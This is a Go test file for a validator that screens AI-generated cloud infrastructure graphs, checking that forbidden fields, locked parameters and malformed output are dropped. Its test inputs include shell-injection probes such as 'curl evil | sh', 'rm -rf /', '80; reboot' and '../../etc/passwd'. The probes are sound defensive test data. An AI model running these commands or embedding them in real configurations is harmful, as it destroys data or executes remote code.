package aigen

import (
	"context"
	"encoding/json"
	"errors"
	"fmt"
	"strings"
	"testing"

	"api/catalog"
	"api/importer"
)

// node and edge build raw model output. Tests pass hand-written JSON through
// the same Validate entry point the endpoint will use.
func node(ref, typ string, params string) string {
	if params == "" {
		return fmt.Sprintf(`{"ref":%q,"type":%q}`, ref, typ)
	}
	return fmt.Sprintf(`{"ref":%q,"type":%q,"parameters":%s}`, ref, typ, params)
}

func edge(s, t string) string { return fmt.Sprintf(`{"source":%q,"target":%q}`, s, t) }

func graph(nodes []string, edges []string) string {
	return fmt.Sprintf(`{"nodes":[%s],"edges":[%s]}`, strings.Join(nodes, ","), strings.Join(edges, ","))
}

func mustValidate(t *testing.T, raw string) *Result {
	t.Helper()
	res, err := Validate([]byte(raw))
	if err != nil {
		t.Fatalf("Validate: %v\ninput: %s", err, raw)
	}
	assertInvariants(t, res)
	return res
}

func hasWarning(res *Result, code string) bool {
	for _, w := range res.Warnings {
		if w.Code == code {
			return true
		}
	}
	return false
}

func nodeByType(res *Result, typ string) []importer.CanvasNode {
	var out []importer.CanvasNode
	for _, n := range res.Nodes {
		if strings.HasPrefix(n.ID, typ+"_") {
			out = append(out, n)
		}
	}
	return out
}

// assertInvariants states what must be true of ANY validated result, however
// hostile the input was. It runs after every case, so each new adversarial
// case is also checked against all of these.
func assertInvariants(t *testing.T, res *Result) {
	t.Helper()
	if len(res.Nodes) == 0 || len(res.Nodes) > catalog.MaxNodes || len(res.Edges) > catalog.MaxEdges {
		t.Errorf("node/edge counts out of bounds: %d nodes, %d edges", len(res.Nodes), len(res.Edges))
	}
	ids := map[string]catalog.Node{}
	for _, n := range res.Nodes {
		if _, dup := ids[n.ID]; dup {
			t.Errorf("duplicate node ID %s", n.ID)
		}
		var cat catalog.Node
		found := false
		for _, c := range catalog.AIGeneratable() {
			if strings.HasPrefix(n.ID, c.ID+"_") && strings.Trim(strings.TrimPrefix(n.ID, c.ID+"_"), "0123456789") == "" {
				cat, found = c, true
			}
		}
		if !found {
			t.Errorf("node %s is not an AI-generatable catalog node", n.ID)
			continue
		}
		ids[n.ID] = cat
		if n.Data.IsCustom || n.Data.RawCode != "" || n.Data.CodeType != "" ||
			n.Data.CredentialID != "" || n.Data.ProjectId != "" || n.Data.Environment != "" || n.Data.Region != "" {
			t.Errorf("node %s carries custom-code or credential fields: %+v", n.ID, n.Data)
		}
		if len(n.Data.Parameters) != len(cat.Params) {
			t.Errorf("node %s has %d parameters, catalog defines %d", n.ID, len(n.Data.Parameters), len(cat.Params))
		}
		for _, p := range cat.Params {
			val, ok := n.Data.Parameters[p.Key]
			if !ok {
				t.Errorf("node %s is missing parameter %s", n.ID, p.Key)
				continue
			}
			if !p.AISettable {
				if val != p.Default {
					t.Errorf("node %s: locked parameter %s changed to %v", n.ID, p.Key, val)
				}
				continue
			}
			switch p.Type {
			case catalog.ParamString, catalog.ParamIntString:
				s, ok := val.(string)
				if !ok || !matches(p, s) || (p.MaxLen > 0 && len(s) > p.MaxLen) {
					t.Errorf("node %s: parameter %s = %#v violates its catalog rule", n.ID, p.Key, val)
				}
			case catalog.ParamEnum:
				s, _ := val.(string)
				okEnum := false
				for _, e := range p.Enum {
					okEnum = okEnum || e == s
				}
				if !okEnum {
					t.Errorf("node %s: parameter %s = %#v not in enum", n.ID, p.Key, val)
				}
			case catalog.ParamInt:
				i, ok := val.(int)
				if !ok || i < p.Min || i > p.Max {
					t.Errorf("node %s: parameter %s = %#v out of range", n.ID, p.Key, val)
				}
			case catalog.ParamBool:
				if _, ok := val.(bool); !ok {
					t.Errorf("node %s: parameter %s = %#v is not a bool", n.ID, p.Key, val)
				}
			}
		}
	}
	seenEdge := map[string]bool{}
	for _, e := range res.Edges {
		s, sok := ids[e.Source]
		tg, tok := ids[e.Target]
		if !sok || !tok {
			t.Errorf("edge %s joins a node that is not in the result", e.ID)
			continue
		}
		if e.Source == e.Target || seenEdge[e.ID] || !catalog.AllowedEdge(s.ID, tg.ID) {
			t.Errorf("edge %s is a self loop, duplicate or disallowed pair", e.ID)
		}
		seenEdge[e.ID] = true
	}
	// Unique resource labels per type.
	labels := map[string]bool{}
	for _, n := range res.Nodes {
		for _, p := range ids[n.ID].Params {
			if p.ResourceLabel {
				k := ids[n.ID].ID + "/" + p.Key + "/" + fmt.Sprint(n.Data.Parameters[p.Key])
				if labels[k] {
					t.Errorf("duplicate resource label %s", k)
				}
				labels[k] = true
			}
		}
	}
	// No cycles.
	adj := map[string][]string{}
	for _, e := range res.Edges {
		adj[e.Source] = append(adj[e.Source], e.Target)
	}
	state := map[string]int{}
	var visit func(string) bool
	visit = func(n string) bool {
		if state[n] == 1 {
			return true
		}
		if state[n] == 2 {
			return false
		}
		state[n] = 1
		for _, m := range adj[n] {
			if visit(m) {
				return true
			}
		}
		state[n] = 2
		return false
	}
	for id := range ids {
		if visit(id) {
			t.Errorf("result contains a cycle")
			break
		}
	}
}

func TestValidHappyPath(t *testing.T) {
	raw := graph([]string{
		node("net", "aws_vpc", `{"vpcName":"prod_vpc","cidrBlock":"10.1.0.0/16"}`),
		node("sub", "aws_subnet", `{"subnetName":"public_a","cidrBlock":"10.1.1.0/24","availabilityZone":"us-east-1b"}`),
		node("fw", "aws_security_group", `{"sgName":"web_sg","httpPort":8080,"allowedCidr":"10.0.0.0/8","sshEnabled":false}`),
		node("vm", "aws_instance.web_server", `{"instanceType":"t3.small","rootVolumeSize":40}`),
		node("web", "nginx", ""),
		node("svc", "systemd_service", `{"serviceName":"nginx","state":"restarted"}`),
		node("port", "open-port", `{"port":8080}`),
	}, []string{
		edge("net", "sub"), edge("net", "fw"), edge("sub", "vm"), edge("fw", "vm"),
		edge("vm", "web"), edge("web", "svc"), edge("svc", "port"),
	})
	res := mustValidate(t, raw)

	if len(res.Nodes) != 7 || len(res.Edges) != 7 {
		t.Fatalf("got %d nodes, %d edges", len(res.Nodes), len(res.Edges))
	}
	if len(res.Warnings) != 0 {
		t.Errorf("unexpected warnings: %+v", res.Warnings)
	}
	vm := nodeByType(res, "aws_instance.web_server")[0]
	if vm.ID != "aws_instance.web_server_1" || vm.Type != "customNode" || vm.Data.Tech != "Terraform" || vm.Data.Icon != "lucide:server" {
		t.Errorf("unexpected node shape: %+v", vm)
	}
	if vm.Data.Parameters["instanceType"] != "t3.small" || vm.Data.Parameters["rootVolumeSize"] != 40 {
		t.Errorf("model parameters not applied: %v", vm.Data.Parameters)
	}
	if vm.Data.Parameters["amiId"] != "ami-785db401" || vm.Data.Parameters["instanceName"] != "web_server" {
		t.Errorf("defaults not filled: %v", vm.Data.Parameters)
	}
	if port := nodeByType(res, "open-port")[0]; port.Data.Parameters["port"] != "8080" {
		t.Errorf("intstring not normalised to a string: %#v", port.Data.Parameters["port"])
	}
	if vpc := nodeByType(res, "aws_vpc")[0]; vpc.Data.Label != "prod_vpc" {
		t.Errorf("label should be the resource name, got %q", vpc.Data.Label)
	}
	if ng := nodeByType(res, "nginx")[0]; ng.Data.Label != "Install Nginx" {
		t.Errorf("label should fall back to the title, got %q", ng.Data.Label)
	}
}

// The validator output must survive the existing layout step and a JSON round
// trip, which is the path it takes to the client and into a saved canvas.
func TestResultFlowsThroughArrangeNodesAndMerge(t *testing.T) {
	res := mustValidate(t, graph(
		[]string{node("a", "aws_vpc", ""), node("b", "aws_subnet", ""), node("c", "nginx", "")},
		[]string{edge("a", "b")}))
	nodesJSON, edgesJSON, err := importer.ArrangeNodesAndMerge("", res.Nodes, res.Edges)
	if err != nil {
		t.Fatal(err)
	}
	var nodes []importer.CanvasNode
	var edges []importer.CanvasEdge
	if json.Unmarshal([]byte(nodesJSON), &nodes) != nil || json.Unmarshal([]byte(edgesJSON), &edges) != nil {
		t.Fatal("arranged output is not valid JSON")
	}
	if len(nodes) != 3 || len(edges) != 1 || nodes[0].Position.X == 0 {
		t.Errorf("unexpected arranged output: %d nodes, %d edges, first at %+v", len(nodes), len(edges), nodes[0].Position)
	}
}

func TestWholeOutputRejections(t *testing.T) {
	tooManyNodes := make([]string, catalog.MaxNodes+1)
	for i := range tooManyNodes {
		tooManyNodes[i] = node(fmt.Sprintf("n%d", i), "nginx", "")
	}
	tooManyEdges := make([]string, catalog.MaxEdges+1)
	for i := range tooManyEdges {
		tooManyEdges[i] = edge("a", "b")
	}

	cases := []struct {
		name string
		raw  string
		want error
	}{
		{"not json", `here is your infrastructure`, ErrMalformed},
		{"truncated", `{"nodes":[`, ErrMalformed},
		{"top-level array", `[]`, ErrMalformed},
		{"unknown top-level field", `{"nodes":[],"edges":[],"explanation":"hi"}`, ErrMalformed},
		{"trailing document", `{"nodes":[],"edges":[]}{"nodes":[]}`, ErrMalformed},
		{"trailing garbage", `{"nodes":[],"edges":[]} rm -rf /`, ErrMalformed},
		{"too many nodes", graph(tooManyNodes, nil), ErrTooLarge},
		{"too many edges", graph([]string{node("a", "nginx", "")}, tooManyEdges), ErrTooLarge},
		{"oversized document", `{"nodes":[],"edges":[],"x":"` + strings.Repeat("a", maxRawBytes) + `"}`, ErrTooLarge},
		{"null", `null`, ErrEmpty},
		{"empty graph", `{"nodes":[],"edges":[]}`, ErrEmpty},
		{"nothing survives", graph([]string{node("a", "shell_command", ""), node("b", "no_such_node", "")}, nil), ErrEmpty},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			res, err := Validate([]byte(c.raw))
			if !errors.Is(err, c.want) || res != nil {
				t.Errorf("got (%v, %v), want %v", res, err, c.want)
			}
			// Errors must not reflect model text.
			if err != nil && strings.Contains(err.Error(), "explanation") {
				t.Errorf("error reflects model output: %v", err)
			}
		})
	}
}

func TestNodesTheModelMayNotPlace(t *testing.T) {
	for _, n := range catalog.All() {
		if n.AIGeneratable {
			continue
		}
		t.Run(n.ID, func(t *testing.T) {
			res := mustValidate(t, graph([]string{node("keep", "nginx", ""), node("bad", n.ID, "")}, nil))
			if len(res.Nodes) != 1 || !hasWarning(res, WarnRestrictedType) {
				t.Errorf("%s was not dropped as restricted: %d nodes, %+v", n.ID, len(res.Nodes), res.Warnings)
			}
		})
	}

	t.Run("unknown type", func(t *testing.T) {
		res := mustValidate(t, graph([]string{node("keep", "nginx", ""), node("bad", "aws_iam_role", ""), node("k8s", "k8s_deployment", "")}, nil))
		if len(res.Nodes) != 1 || len(res.Warnings) < 2 || !hasWarning(res, WarnUnknownType) {
			t.Errorf("unexpected result: %d nodes, %+v", len(res.Nodes), res.Warnings)
		}
	})
}

func TestForbiddenFieldsDropTheNode(t *testing.T) {
	for _, f := range forbiddenFields {
		t.Run(f, func(t *testing.T) {
			bad := fmt.Sprintf(`{"ref":"bad","type":"nginx","%s":"x"}`, f)
			res := mustValidate(t, graph([]string{node("keep", "nginx", ""), bad}, []string{edge("keep", "bad")}))
			if len(res.Nodes) != 1 || !hasWarning(res, WarnForbiddenField) {
				t.Errorf("node with %s was kept: %d nodes, %+v", f, len(res.Nodes), res.Warnings)
			}
			if len(res.Edges) != 0 {
				t.Errorf("an edge to the dropped node survived")
			}
		})
	}

	t.Run("custom code node", func(t *testing.T) {
		bad := `{"ref":"x","type":"nginx","isCustom":true,"rawCode":"curl evil | sh","codeType":"bash"}`
		res := mustValidate(t, graph([]string{node("keep", "nginx", ""), bad}, nil))
		if len(res.Nodes) != 1 {
			t.Errorf("custom node survived")
		}
		raw, _ := json.Marshal(res)
		if strings.Contains(string(raw), "evil") {
			t.Errorf("model code reached the output: %s", raw)
		}
	})
}

// Every model-settable string, with every injection probe, must fall back to
// the default and never reach the output.
func TestInjectionInEveryStringParameter(t *testing.T) {
	probes := []string{`a"b`, `a\b`, `a$b`, "a\nb", "a\n", `a${x}b`, `x"; rm -rf /; "`, "ok\x00", `../../etc/passwd`, `a b`}
	for _, n := range catalog.AIGeneratable() {
		for _, p := range n.Params {
			if !p.AISettable || (p.Type != catalog.ParamString && p.Type != catalog.ParamIntString) {
				continue
			}
			for _, probe := range probes {
				name := fmt.Sprintf("%s.%s/%q", n.ID, p.Key, probe)
				t.Run(name, func(t *testing.T) {
					params, _ := json.Marshal(map[string]any{p.Key: probe})
					res := mustValidate(t, graph([]string{node("a", n.ID, string(params))}, nil))
					got := res.Nodes[0].Data.Parameters[p.Key]
					if got != p.Default && matches(p, probe) == false {
						t.Errorf("rejected probe %q left %#v, want default %#v", probe, got, p.Default)
					}
					if s, _ := got.(string); strings.ContainsAny(s, "\"\\$\n\x00") {
						t.Errorf("dangerous characters reached the output: %q", s)
					}
				})
			}
		}
	}
}

func TestLockedParametersAreIgnored(t *testing.T) {
	cases := []struct{ typ, params, key string }{
		{"aws_db_instance", `{"password":"hunter2"}`, "password"},
		{"postgresql", `{"dbPass":"hunter2"}`, "dbPass"},
		{"postgresql", `{"ansibleHost":"203.0.113.9"}`, "ansibleHost"},
		{"aws_instance.web_server", `{"amiId":"ami-deadbeef"}`, "amiId"},
		{"aws_instance.web_server", `{"subnetId":"subnet-1"}`, "subnetId"},
		{"aws_s3_bucket", `{"forceDestroy":false}`, "forceDestroy"},
		{"aws_security_group", `{"vpcId":"vpc-123"}`, "vpcId"},
		{"aws_db_instance", `{"vpcSecurityGroupIds":"sg-1"}`, "vpcSecurityGroupIds"},
	}
	for _, c := range cases {
		t.Run(c.typ+"."+c.key, func(t *testing.T) {
			res := mustValidate(t, graph([]string{node("a", c.typ, c.params)}, nil))
			if !hasWarning(res, WarnParamLocked) {
				t.Errorf("no warning for locked parameter: %+v", res.Warnings)
			}
			raw, _ := json.Marshal(res)
			for _, secret := range []string{"hunter2", "203.0.113.9", "ami-deadbeef", "subnet-1", "vpc-123", "sg-1"} {
				if strings.Contains(string(raw), secret) {
					t.Errorf("locked value %q reached the output", secret)
				}
			}
		})
	}

	t.Run("unknown parameter", func(t *testing.T) {
		res := mustValidate(t, graph([]string{node("a", "nginx", `{"user_data":"curl x|sh"}`)}, nil))
		if !hasWarning(res, WarnUnknownParam) {
			t.Error("no warning for an unknown parameter")
		}
		if raw, _ := json.Marshal(res); strings.Contains(string(raw), "curl") {
			t.Error("unknown parameter value reached the output")
		}
	})
}

// accepted names the cases whose value is valid and so must not warn.
var accepted = map[string]bool{
	"int integral float ok": true, "intstring number ok": true, "intstring string ok": true,
	"intstring leading zeros": true, "packages list ok": true,
}

func TestParameterTypeAndRangeEnforcement(t *testing.T) {
	cases := []struct {
		name, typ, params, key string
		want                   any
	}{
		{"enum outside list", "aws_instance.web_server", `{"instanceType":"p4d.24xlarge"}`, "instanceType", "t3.medium"},
		{"enum wrong type", "aws_instance.web_server", `{"instanceType":5}`, "instanceType", "t3.medium"},
		{"int too large", "aws_instance.web_server", `{"rootVolumeSize":100000}`, "rootVolumeSize", 30},
		{"int too small", "aws_instance.web_server", `{"rootVolumeSize":1}`, "rootVolumeSize", 30},
		{"int as string", "aws_instance.web_server", `{"rootVolumeSize":"50"}`, "rootVolumeSize", 30},
		{"int fractional", "aws_instance.web_server", `{"rootVolumeSize":50.5}`, "rootVolumeSize", 30},
		{"int huge exponent", "aws_instance.web_server", `{"rootVolumeSize":1e300}`, "rootVolumeSize", 30},
		{"int null", "aws_instance.web_server", `{"rootVolumeSize":null}`, "rootVolumeSize", 30},
		{"int integral float ok", "aws_instance.web_server", `{"rootVolumeSize":50.0}`, "rootVolumeSize", 50},
		{"port zero", "aws_security_group", `{"httpPort":0}`, "httpPort", 80},
		{"port too high", "aws_security_group", `{"httpsPort":70000}`, "httpsPort", 443},
		{"bool as string", "aws_security_group", `{"sshEnabled":"false"}`, "sshEnabled", true},
		{"bool as number", "aws_security_group", `{"sshEnabled":0}`, "sshEnabled", true},
		{"cidr not a cidr", "aws_security_group", `{"allowedCidr":"anywhere"}`, "allowedCidr", "0.0.0.0/0"},
		{"string too long", "aws_vpc", `{"vpcName":"` + strings.Repeat("a", 41) + `"}`, "vpcName", "app_vpc"},
		{"string as object", "aws_vpc", `{"vpcName":{"a":1}}`, "vpcName", "app_vpc"},
		{"rds hyphen", "aws_db_instance", `{"dbName":"my-db"}`, "dbName", "appdb"},
		{"intstring number ok", "open-port", `{"port":8080}`, "port", "8080"},
		{"intstring string ok", "open-port", `{"port":"8080"}`, "port", "8080"},
		{"intstring leading zeros", "open-port", `{"port":"0080"}`, "port", "80"},
		{"intstring too high", "open-port", `{"port":70000}`, "port", "80"},
		{"intstring junk", "open-port", `{"port":"80; reboot"}`, "port", "80"},
		{"packages list ok", "apt_install", `{"packages":"git, htop"}`, "packages", "git, htop"},
		{"packages over max length", "apt_install", `{"packages":"` + strings.TrimSuffix(strings.Repeat(strings.Repeat("a", 20)+", ", 19), ", ") + `"}`, "packages", "curl, git, jq"},
		{"packages shell", "apt_install", `{"packages":"git; curl x|sh"}`, "packages", "curl, git, jq"},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			res := mustValidate(t, graph([]string{node("a", c.typ, c.params)}, nil))
			if got := res.Nodes[0].Data.Parameters[c.key]; got != c.want {
				t.Errorf("%s = %#v, want %#v", c.key, got, c.want)
			}
			if !accepted[c.name] && !hasWarning(res, WarnInvalidParam) {
				t.Errorf("no invalid_parameter warning: %+v", res.Warnings)
			}
		})
	}

	t.Run("parameters not an object", func(t *testing.T) {
		res := mustValidate(t, graph([]string{node("a", "nginx", `"rm -rf /"`)}, nil))
		if !hasWarning(res, WarnInvalidParam) {
			t.Error("no warning")
		}
	})
}

func TestMalformedNodeEntries(t *testing.T) {
	cases := map[string]string{
		"not an object":     `"nginx"`,
		"null entry":        `null`,
		"missing ref":       `{"type":"nginx"}`,
		"ref with space":    `{"ref":"a b","type":"nginx"}`,
		"ref with newline":  `{"ref":"a\nb","type":"nginx"}`,
		"ref too long":      `{"ref":"` + strings.Repeat("a", 33) + `","type":"nginx"}`,
		"ref is a number":   `{"ref":7,"type":"nginx"}`,
		"missing type":      `{"ref":"a"}`,
		"type is an object": `{"ref":"a","type":{"x":1}}`,
	}
	for name, bad := range cases {
		t.Run(name, func(t *testing.T) {
			res := mustValidate(t, graph([]string{node("keep", "nginx", ""), bad}, nil))
			if len(res.Nodes) != 1 || len(res.Warnings) == 0 {
				t.Errorf("malformed entry was kept: %d nodes, %+v", len(res.Nodes), res.Warnings)
			}
		})
	}
}

func TestServerAssignsIDs(t *testing.T) {
	// A model-supplied id must never become the canvas ID.
	raw := `{"nodes":[{"ref":"a","type":"nginx","id":"../../etc/passwd"},{"ref":"b","type":"nginx","id":"nginx_1"}],"edges":[]}`
	res := mustValidate(t, raw)
	if res.Nodes[0].ID != "nginx_1" || res.Nodes[1].ID != "nginx_2" {
		t.Errorf("IDs not server-assigned: %s, %s", res.Nodes[0].ID, res.Nodes[1].ID)
	}
}

func TestDuplicateRefs(t *testing.T) {
	res := mustValidate(t, graph([]string{node("a", "aws_vpc", ""), node("a", "aws_subnet", "")}, nil))
	if len(res.Nodes) != 1 || res.Nodes[0].Data.Tech != "Terraform" || nodeByType(res, "aws_vpc") == nil || !hasWarning(res, WarnDuplicateRef) {
		t.Errorf("duplicate ref handling wrong: %+v / %+v", res.Nodes, res.Warnings)
	}

	// A dropped node's ref cannot be reused to smuggle in a different node.
	res = mustValidate(t, graph(
		[]string{node("x", "shell_command", ""), node("x", "nginx", ""), node("keep", "nginx", "")},
		[]string{edge("keep", "x")}))
	if len(res.Nodes) != 1 || len(res.Edges) != 0 {
		t.Errorf("a reused ref resurrected a dropped node: %d nodes, %d edges", len(res.Nodes), len(res.Edges))
	}
}

func TestEdgeRules(t *testing.T) {
	base := []string{
		node("vpc", "aws_vpc", ""), node("sub", "aws_subnet", ""), node("vm", "aws_instance.web_server", ""),
		node("web", "nginx", ""), node("pkg", "update-packages", ""), node("bad", "shell_command", ""),
	}
	cases := []struct {
		name      string
		edges     []string
		wantEdges int
	}{
		{"valid", []string{edge("vpc", "sub")}, 1},
		{"missing source", []string{edge("ghost", "sub")}, 0},
		{"missing target", []string{edge("vpc", "ghost")}, 0},
		{"self loop", []string{edge("web", "web")}, 0},
		{"duplicate", []string{edge("vpc", "sub"), edge("vpc", "sub")}, 1},
		{"wrong direction", []string{edge("sub", "vpc")}, 0},
		{"disallowed pair", []string{edge("web", "vpc")}, 0},
		{"software to hardware", []string{edge("web", "vm")}, 0},
		{"to a dropped node", []string{edge("vm", "bad")}, 0},
		{"from a dropped node", []string{edge("bad", "web")}, 0},
		{"two-node cycle", []string{edge("web", "pkg"), edge("pkg", "web")}, 1},
		{"edge without fields", []string{`{}`, `{"source":"vpc"}`, `{"source":1,"target":2}`}, 0},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			res := mustValidate(t, graph(base, c.edges))
			if len(res.Edges) != c.wantEdges {
				t.Errorf("got %d edges, want %d (%+v)", len(res.Edges), c.wantEdges, res.Warnings)
			}
			if len(c.edges) > c.wantEdges && !hasWarning(res, WarnDroppedEdge) {
				t.Errorf("no dropped_edge warning")
			}
		})
	}

	t.Run("long cycle", func(t *testing.T) {
		res := mustValidate(t, graph(
			[]string{node("a", "nginx", ""), node("b", "nodejs", ""), node("c", "update-packages", "")},
			[]string{edge("a", "b"), edge("b", "c"), edge("c", "a")}))
		if len(res.Edges) != 2 {
			t.Errorf("got %d edges, want 2 (the edge closing the cycle dropped)", len(res.Edges))
		}
	})
}

func TestResourceLabelsAreMadeUnique(t *testing.T) {
	// A model that omits names gives every subnet the default name.
	res := mustValidate(t, graph([]string{
		node("s1", "aws_subnet", ""),
		node("s2", "aws_subnet", `{"cidrBlock":"10.0.2.0/24"}`),
		node("s3", "aws_subnet", `{"subnetName":"app_subnet_1a_2"}`),
		node("b1", "aws_s3_bucket", `{"bucketName":"logs-bucket"}`),
		node("b2", "aws_s3_bucket", `{"bucketName":"logs-bucket"}`),
	}, nil))

	got := map[string]bool{}
	for _, n := range nodeByType(res, "aws_subnet") {
		got[n.Data.Parameters["subnetName"].(string)] = true
	}
	if len(got) != 3 {
		t.Errorf("subnet names not unique: %v", got)
	}
	if !hasWarning(res, WarnRenamed) {
		t.Error("no renamed warning")
	}
	buckets := nodeByType(res, "aws_s3_bucket")
	if buckets[1].Data.Parameters["bucketName"] != "logs-bucket-2" {
		t.Errorf("bucket (which forbids underscores) renamed to %v", buckets[1].Data.Parameters["bucketName"])
	}

	// The same name on different types is fine: labels are scoped per type.
	res = mustValidate(t, graph([]string{
		node("a", "aws_vpc", `{"vpcName":"shared"}`), node("b", "aws_subnet", `{"subnetName":"shared"}`),
	}, nil))
	if hasWarning(res, WarnRenamed) {
		t.Errorf("same name on different types was renamed: %+v", res.Warnings)
	}
}

func TestUnhostedAnsibleWarning(t *testing.T) {
	res := mustValidate(t, graph(
		[]string{node("vm", "aws_instance.web_server", ""), node("a", "update-packages", ""), node("b", "nginx", ""), node("lonely", "nodejs", "")},
		[]string{edge("vm", "a"), edge("a", "b")}))
	var warned []string
	for _, w := range res.Warnings {
		if w.Code == WarnNoHost {
			warned = append(warned, w.Ref)
		}
	}
	if len(warned) != 1 || warned[0] != "lonely" {
		t.Errorf("no_host warned for %v, want only [lonely]", warned)
	}
}

// Raw model strings may appear in warnings (the review UI shows them), so they
// must be bounded and escaped.
func TestWarningsDoNotReflectRawModelText(t *testing.T) {
	long := strings.Repeat("A", 500)
	raw := graph([]string{
		node("keep", "nginx", ""),
		node("x", long, ""),
		node("y", "nginx", fmt.Sprintf(`{%q:"v"}`, "k\n"+long)),
	}, []string{edge(long, "keep")})
	res := mustValidate(t, raw)
	for _, w := range res.Warnings {
		if len(w.Message) > 400 || strings.ContainsAny(w.Message, "\n\r") {
			t.Errorf("warning not bounded/escaped: %q", w.Message)
		}
	}
}

// End to end through the Generator seam with the fake provider, as the
// endpoint will use it.
func TestFakeGeneratorThroughValidate(t *testing.T) {
	g := &FakeGenerator{
		Output: json.RawMessage(graph([]string{node("a", "aws_vpc", "")}, nil)),
		Usage:  Usage{InputTokens: 120, OutputTokens: 80},
	}
	out, usage, err := g.Generate(context.Background(), GenerateRequest{Prompt: "a vpc", Schema: catalog.JSONSchema()})
	if err != nil || usage.OutputTokens != 80 {
		t.Fatalf("generate: %v %+v", err, usage)
	}
	mustValidate(t, string(out))
	if reqs := g.Requests(); len(reqs) != 1 || reqs[0].Prompt != "a vpc" || reqs[0].Schema == nil {
		t.Errorf("request not recorded: %+v", reqs)
	}

	g.Err = errors.New("provider down")
	if _, _, err := g.Generate(context.Background(), GenerateRequest{}); err == nil {
		t.Error("expected the configured error")
	}
}

// The schema offered to a provider and the validator must agree: a node the
// schema describes must validate, with every settable parameter at an
// accepted value. Guards against the two drifting apart.
func TestEverySchemaNodeValidates(t *testing.T) {
	for _, n := range catalog.AIGeneratable() {
		params := map[string]any{}
		for _, p := range n.Params {
			if p.AISettable {
				params[p.Key] = p.Default
			}
		}
		b, _ := json.Marshal(params)
		res := mustValidate(t, graph([]string{node("a", n.ID, string(b))}, nil))
		for _, w := range res.Warnings {
			if w.Code != WarnNoHost {
				t.Errorf("%s: default settable parameters produced a warning: %+v", n.ID, w)
			}
		}
	}
}

func TestUsedLabelsReadsTheExistingCanvas(t *testing.T) {
	nodes := `[
	  {"id":"aws_vpc_1","data":{"parameters":{"vpcName":"prod_vpc"}}},
	  {"id":"aws_subnet_2","data":{"parameters":{"subnetName":"pub_a"}}},
	  {"id":"nginx_1","data":{"parameters":{"ansibleUser":"ubuntu"}}},
	  {"id":"custom_9","data":{"parameters":{"vpcName":"ignored"}}},
	  {"id":"aws_vpc_3","data":{"parameters":{"vpcName":5}}},
	  {"id":"aws_vpc_4","data":{}}]`
	used := UsedLabels(nodes)
	if !used[LabelKey("aws_vpc", "vpcName", "prod_vpc")] || !used[LabelKey("aws_subnet", "subnetName", "pub_a")] {
		t.Errorf("labels not collected: %v", used)
	}
	if len(used) != 2 {
		t.Errorf("collected more than the catalog's resource labels: %v", used)
	}
	if len(UsedLabels(`not json`)) != 0 || len(UsedLabels(``)) != 0 || len(UsedLabels(`[]`)) != 0 {
		t.Error("unreadable or empty canvases must yield no labels")
	}
}

func TestProposalNamesAreUniqueAgainstTheExistingCanvas(t *testing.T) {
	used := UsedLabels(`[{"id":"aws_vpc_1","data":{"parameters":{"vpcName":"app_vpc"}}},{"id":"aws_s3_bucket_1","data":{"parameters":{"bucketName":"logs"}}}]`)
	raw := graph([]string{
		node("net", "aws_vpc", ""),                          // default app_vpc clashes
		node("b", "aws_s3_bucket", `{"bucketName":"logs"}`), // clashes, and '_' is not allowed in bucket names
		node("sub", "aws_subnet", ""),                       // no clash
	}, nil)
	res, err := ValidateWithUsed([]byte(raw), used)
	if err != nil {
		t.Fatal(err)
	}
	assertInvariants(t, res)
	if got := nodeByType(res, "aws_vpc")[0].Data.Parameters["vpcName"]; got != "app_vpc_2" {
		t.Errorf("vpcName = %v, want app_vpc_2", got)
	}
	if got := nodeByType(res, "aws_s3_bucket")[0].Data.Parameters["bucketName"]; got != "logs-2" {
		t.Errorf("bucketName = %v, want logs-2", got)
	}
	if got := nodeByType(res, "aws_subnet")[0].Data.Parameters["subnetName"]; got != "app_subnet_1a" {
		t.Errorf("an unclashing name was changed: %v", got)
	}
	if !hasWarning(res, WarnRenamed) {
		t.Error("no renamed warning")
	}

	// Validate (no canvas) must be unaffected by the new parameter.
	res = mustValidate(t, raw)
	if got := nodeByType(res, "aws_vpc")[0].Data.Parameters["vpcName"]; got != "app_vpc" {
		t.Errorf("vpcName = %v without an existing canvas", got)
	}
}
